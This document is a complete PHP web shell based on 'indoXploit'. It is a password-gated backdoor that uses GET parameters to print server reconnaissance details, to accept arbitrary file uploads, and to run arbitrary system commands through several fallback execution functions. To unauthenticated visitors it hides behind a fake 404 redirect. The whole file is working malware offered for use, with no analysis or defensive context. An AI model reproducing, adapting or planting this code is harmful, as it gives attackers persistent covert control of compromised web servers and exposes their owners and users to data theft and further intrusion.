<?php
/*
Based indoXploit Shell
Thanks All Member indoXploit
*/
error_reporting(0);
$str = "327b8930742010220bcbc4da97dc38f7"; #MAKLO

function RandomString($length) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}
function writeable($path, $perms) {
	return (!is_writable($path)) ? $perms : $perms;
}

$SERVERIP  = $_SERVER['SERVER_ADDR'];
$YOURIP = $_SERVER['REMOTE_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
$OS = OS();
$perms = perms($FILEPATH);
$WRITABLE = writeable($FILEPATH,$perms);
$WEBSERV = $_SERVER['SERVER_SOFTWARE'];
$SYSTEM = php_uname();
$disable_functions = @ini_get('disable_functions');
$disable_functions = (!empty($disable_functions)) ?  $disable_functions :  "NONE";
$SAFEM = (@ini_get(strtoupper("safe_mode")) === "ON" ? "ON" : "OFF");
$MYSQL = (function_exists('mysql_connect') ? "ON" : "OFF");
$CURL = (function_exists('curl_version') ? "ON" : "OFF");
$WGET = (exe('wget --help') ? "ON" : "OFF");
$PERL = (exe('perl --help') ? "ON" : "OFF");
$PYTHON = (exe('python --help') ? "ON" : "OFF");



$pass = $_GET['Zeeday'];
$up = $_GET['ZeedayUP'];
$exec = $_GET['ZeedayExec'];
$cmd = $_GET['ZeedayCmd'];
$encodeA = md5($pass);
$encodeB = md5($up);
$encodeC = md5($exec);

if($str == $encodeA){
	echo RandomString(99);
	echo "\n";
	echo RandomString(99);
	echo "\n";
	echo RandomString(99);
	echo "\n";
 	print("SERVER IP: $SERVERIP | YOUR IP: $YOURIP\n");
	print("SHELLPATH: $FILEPATH | PERMISSION: $perms | WRITABLE: $WRITABLE \n");
    print("OS: $OS\n");
    print("WEB SERVER: $WEBSERV\n");
    print("SYSTEM: $SYSTEM\n");
    print("SAFE MODE: $SAFEM\n");
    print("MYSQL: $MYSQL | cURL: $CURL | WGET: $WGET | PERL: $PERL | PYTHON: $PYTHON\n");
    print("DISABLE FUNCTION: $disable_functions\n");
}
elseif($str == $encodeB){
	echo RandomString(99);
	echo "\n";
	echo RandomString(99);
	echo "\n";
	echo RandomString(99);
	echo "\n";
	echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
	<label for=\"file\"></label>
	<input type=\"file\" name=\"file\" id=\"file\" />
	<br /><br />
	<input type=\"submit\" name=\"default\" id=\"default\" value=\"Upload\">
	</form>";
	move_uploaded_file($_FILES["file"]["tmp_name"],"" . $_FILES["file"]["name"]);
	echo "Filename : " . "" . $_FILES["file"]["name"];
}elseif($str == $encodeC){
    echo exe($cmd);
    echo "\n";
}
else{
	echo "<html><script>window.location.replace('404.html')</script></html>";
}

?>
